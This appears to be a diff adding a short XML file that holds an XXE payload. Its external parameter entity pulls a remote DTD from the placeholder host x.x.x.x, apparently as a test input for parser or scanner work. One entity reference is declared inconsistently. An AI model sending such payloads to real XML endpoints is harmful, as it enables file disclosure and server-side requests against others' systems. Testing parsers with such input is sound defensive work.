@@ -1,0 +1,8 @@
+<?xml version="1.0" ?>
+<!DOCTYPE xxeElement [
+<!ELEMENT xxeElement ANY >
+<!ENTITY % xxeEntity SYSTEM "http://x.x.x.x/test.xml">
+%xxeEntity;
+%content;
+]>
+<xxeElement>&xxeEntity;</xxeElement>
